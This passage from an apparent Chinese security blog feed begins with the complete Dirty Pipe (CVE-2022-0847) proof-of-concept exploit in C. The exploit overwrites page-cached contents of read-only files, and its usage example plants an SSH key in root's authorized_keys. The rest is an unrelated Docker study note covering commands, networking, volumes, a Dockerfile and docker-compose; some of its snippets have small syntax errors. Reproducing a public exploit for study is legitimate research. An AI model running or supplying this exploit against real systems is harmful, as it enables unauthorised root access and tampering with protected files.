class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> p[<span class="hljs-number">2</span>])</span><br>&#123;<br><span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>write(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>read(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-type">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> end_offset = offset + (<span class="hljs-type">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-type">int</span> p[<span class="hljs-number">2</span>];<br>prepare_pipe(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker学习笔记</title>
    <link href="/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="docker学习笔记"><a href="#docker学习笔记" class="headerlink" title="docker学习笔记"></a>docker学习笔记</h1><h2 id="1-什么是docker"><a href="#1-什么是docker" class="headerlink" title="1.什么是docker?"></a>1.什么是docker?</h2><p>1.docker是一种基于容器的虚拟化技术,可以让开发者将开发的软件以及依赖打包成一个镜像然后发布到任何流行的linux或windows服务器上面</p><h2 id="2-为什么要用docker"><a href="#2-为什么要用docker" class="headerlink" title="2.为什么要用docker?"></a>2.为什么要用docker?</h2><p>作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p><ul><li>更高效的系统利用资源</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>更快速的启动时间</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>一致的运行环境</li></ul><p>开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 「这段代码在我机器上没问题啊」 这类问题。</p><ul><li>持续交付和部署</li></ul><p>对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。<br>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery&#x2F;Deployment) 系统进行自动部署。<br>而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像</p><ul><li>更轻松的迁移</li></ul><p>由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><ul><li>更轻松的维护和扩展</li></ul><p>Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的 官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。</p><h2 id="3-docker架构"><a href="#3-docker架构" class="headerlink" title="3.docker架构"></a>3.docker架构</h2><h4 id="3-1-docker三个概念"><a href="#3-1-docker三个概念" class="headerlink" title="3.1.docker三个概念"></a>3.1.docker三个概念</h4><ul><li><p>容器</p><p>容器时镜像的运行实例,容器可以启动,停止,删除。</p></li><li><p>镜像</p><p>创建docker容器的模板,相当于一个根文件系统,在docker运行的时候,docker会将镜像挂载</p></li><li><p>仓库</p><p>存储docker镜像的仓库</p><p>docker实现结构</p><p><img src="/images/docker-on-linux.png" alt="&quot;docker&quot;"></p></li></ul><h2 id="4-docker体系结构"><a href="#4-docker体系结构" class="headerlink" title="4.docker体系结构"></a>4.docker体系结构</h2><p>docker采用C&#x2F;S结构,docker daemon作为server接收client的请求,client和server可以运行在同一台机器上,也可以使用socket通信的方式运行在不同的机器上面</p><ul><li>docker守护进程(docker deamon)</li></ul><p>docker在后台运行的服务端程序,等待docker client的请求</p><ul><li><p>docker客户端(docker client)</p><p>是用户与Docker交互方式。它接受用户指令并且与背后的Docker守护进程通信。</p></li></ul><h2 id="5-docker安装"><a href="#5-docker安装" class="headerlink" title="5.docker安装"></a>5.docker安装</h2><p>1.脚本安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://get.docker.com -o get-docker.sh<br>./get-docker.sh<br></code></pre></td></tr></table></figure><p>2.包管理器安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S docker<br></code></pre></td></tr></table></figure><p>3.docker换源</p><p>编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ghcr.io&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.baidubce.com&quot;</span><br>  ]<br>&#125;<br><span class="hljs-comment">#换源后需要重启docker才能生效</span><br>systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="6-docker使用"><a href="#6-docker使用" class="headerlink" title="6.docker使用"></a>6.docker使用</h2><h3 id="6-1-docker的基本使用"><a href="#6-1-docker的基本使用" class="headerlink" title="6.1.docker的基本使用"></a>6.1.docker的基本使用</h3><p>1.获取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull helloworld<br></code></pre></td></tr></table></figure><p>2.创建并运行容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it image:tag <span class="hljs-built_in">command</span><br><span class="hljs-comment">#-i(interactive)以交互方式启动docker容器</span><br><span class="hljs-comment">#-t(tty)分配一个tty</span><br><span class="hljs-comment">#--hostname 指定容器内的主机名</span><br><span class="hljs-comment">#--name 指定容器的名称</span><br><span class="hljs-comment">#--privileged 赋予容器root权限</span><br><span class="hljs-comment">#-p 指定端口映射</span><br><span class="hljs-comment">#-v 映射容器卷</span><br><span class="hljs-comment">#command 指需要执行的命令</span><br>注意:正在运行的docker容器一定要有一个前台进程,否则该docker会认为没有正在运行的进程,即退出该容器<br></code></pre></td></tr></table></figure><p>3.启动或停止docker容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看所有的容器</span><br>docker ps -a<br><span class="hljs-comment">#启动一个docker容器</span><br>docker start $(container_id)<br>docker stop $(container_id)<br></code></pre></td></tr></table></figure><p>4.其他常用的docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it /bin/bash<br><span class="hljs-comment">#在容器内重新开启一个shell,并且进入到该shell</span><br>docker attach container_id<br><span class="hljs-comment">#进入到指定容器id内正在运行的终端</span><br>docker top container_id<br><span class="hljs-comment">#查看某容器内的进程情况</span><br>docker logs container_id<br><span class="hljs-comment">#查看某容器的日志</span><br>docker inspect container_id<br><span class="hljs-comment">#查看某容器的配置以及详细信息</span><br>docker commit -a <span class="hljs-string">&quot;&quot;</span> -m <span class="hljs-string">&quot;&quot;</span> container_id image:tag<br><span class="hljs-comment">#将某一个容器打包成镜像</span><br>docker <span class="hljs-built_in">export</span> container_id &gt; ubuntu.tar<br><span class="hljs-comment">#导出一个docker容器(不包含映射的容器卷以及映射路径)</span><br><span class="hljs-built_in">cat</span> docker/ubuntu.tar | docker import - <span class="hljs-built_in">test</span>/ubuntu:v1<br><span class="hljs-comment">#将一个tar包导入成docker镜像</span><br>docker <span class="hljs-built_in">rm</span> container_id<br><span class="hljs-comment">#删除一个docker容器</span><br></code></pre></td></tr></table></figure><h3 id="6-2-docker网络"><a href="#6-2-docker网络" class="headerlink" title="6.2.docker网络"></a>6.2.docker网络</h3><p>docker一共有5中网络模式</p><ul><li><p>bridge</p><p>docker的默认网络模式,创建一块虚拟网卡连接上物理网卡,所有的docker将库创建一对虚拟接口,veth&amp;eth0一个在容器内，一个在网桥上,网桥提供路由功能,(可以想象为虚拟机内的nat模式)</p></li><li><p>macvlan</p><p>创建一个虚拟网卡,直接连接至物理网卡,该网络模式下容器分配的ip地址和物理机在同一个网段(相当于虚拟机内的桥接模式)</p></li><li><p>host</p><p>与宿主机共享网卡</p></li><li><p>container</p><p>和已经存在的容器共享一块网卡</p></li><li><p>none</p><p>不创建网络,无法联网</p></li></ul><h5 id="docker网络的创建"><a href="#docker网络的创建" class="headerlink" title="docker网络的创建"></a>docker网络的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个桥接的docker网络</span><br>docker network creat -d bridge --subnet=172.20.0.1/24 --gateway=172.20.0.1 -o parent=eth0 mybridge<br></code></pre></td></tr></table></figure><h2 id="6-3-docker数据卷"><a href="#6-3-docker数据卷" class="headerlink" title="6.3.docker数据卷"></a>6.3.docker数据卷</h2><p>  因为docker容器中的数据在docker容器删除后会全部消失,因此可以借助docker容器数据卷来实现docker容i数据的本地持久化.docker容器数据卷永久有效,除非手动删除,并且docker数据卷可以让多个docker容器共享数据</p><h5 id="数据卷的创建"><a href="#数据卷的创建" class="headerlink" title="数据卷的创建"></a>数据卷的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker volume create volume_name<br></code></pre></td></tr></table></figure><h5 id="数据卷的挂载"><a href="#数据卷的挂载" class="headerlink" title="数据卷的挂载"></a>数据卷的挂载</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v volume_name:container_path image_name<br></code></pre></td></tr></table></figure><h2 id="7-Dockerfile"><a href="#7-Dockerfile" class="headerlink" title="7.Dockerfile"></a>7.Dockerfile</h2><h5 id="什么是Dockerfile"><a href="#什么是Dockerfile" class="headerlink" title="什么是Dockerfile?"></a>什么是Dockerfile?</h5><p>  dockerfile是一个用于构建docker镜像的脚本,docker可以读取dockerfile文件自动构建docker镜像</p><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用?"></a>如何使用?</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#当dockerfile命名为Dockerfile并且当前在dockerfile路径下</span><br>docker build -t name:tag .<br><span class="hljs-comment">#指定dockerfile文件路径</span><br>docker build -f /path/to/dockerfile -t name:tag<br></code></pre></td></tr></table></figure><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<br><span class="hljs-keyword">MAINTAINER</span> bugprogram-git<br><span class="hljs-keyword">ENV</span> TZ=Asia/Shanghai<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list \ </span><br>&amp;&amp; apt-get update \<br>&amp;&amp; ln -snf /usr/share/zoneinfo/$TZ /etc/localtime <br>&amp;&amp; echo $TZ &gt; /etc/timezone \<br>apt-get install -y tzdata unzip wget npm curl \<br>&amp;&amp; apt-get clean \<br>&amp;&amp; apt-get autoclean \<br>&amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /minecraft \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">mkdir</span> /minecraft/dashboard \</span><br><span class="language-bash">&amp;&amp; wget https://github.com/Suwings/MCSManager/archive/refs/tags/v8.6.23.zip \</span><br><span class="language-bash">&amp;&amp; unzip v8.6.23.zip -d /minecraft/dashboard </span><br><span class="hljs-comment">#同样的后面的文件名以及解压的目录名要根据实际情况进行修改</span><br>&amp;&amp; mv /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span>/* /minecraft/dashboard <br>&amp;&amp; rm -rf /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span> \<br>&amp;&amp; apt purge  -y unzip wget \<br>&amp;&amp; apt autoremove -y \<br>&amp;&amp; rm /v8.<span class="hljs-number">6.23</span>.zip \<br>&amp;&amp; cd /minecraft/dashboard &amp;&amp; npm install<br><span class="hljs-keyword">EXPOSE</span> [<span class="hljs-number">19132</span>,<span class="hljs-number">23333</span>]<br><span class="hljs-comment">#对外暴露的端口</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /minecraft/dashboard/ &amp;&amp; npm start</span><br></code></pre></td></tr></table></figure><h2 id="8-docker-compose"><a href="#8-docker-compose" class="headerlink" title="8.docker-compose"></a>8.docker-compose</h2><h5 id="什么是docker-compose"><a href="#什么是docker-compose" class="headerlink" title="什么是docker-compose?"></a>什么是docker-compose?</h5><p>  docker-compose是一个用python写的容器编排工具,在连续部署多个容器的时候,可以使用一个docker-compose脚本实现一次部署多个容器,大大提高了容器编排效率</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.0&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>  <span class="hljs-comment">#容器名称</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-comment">#指定构建的上下文路径</span><br>    <span class="hljs-attr">image:</span><br>    <span class="hljs-comment">#指定镜像的名称</span><br>      <span class="hljs-string">nginx:alpine</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-comment">#指定映射的端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>    <span class="hljs-comment">#指定挂载的容器卷</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">volumes:/code</span><br>    <span class="hljs-attr">links:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:latest</span><br><span class="hljs-attr">volumes:</span><br>  <span class="hljs-string">redis:&#123;&#125;</span><br><span class="hljs-comment">#定义网络</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">external:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">my-pre-existing-network</span><br>      <span class="hljs-comment">#这里不能使用默认的docker0网络,只能使用用户自定义的网络</span><br></code></pre></td></tr></table></figure><p>  docker-compose常用的一些属性如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 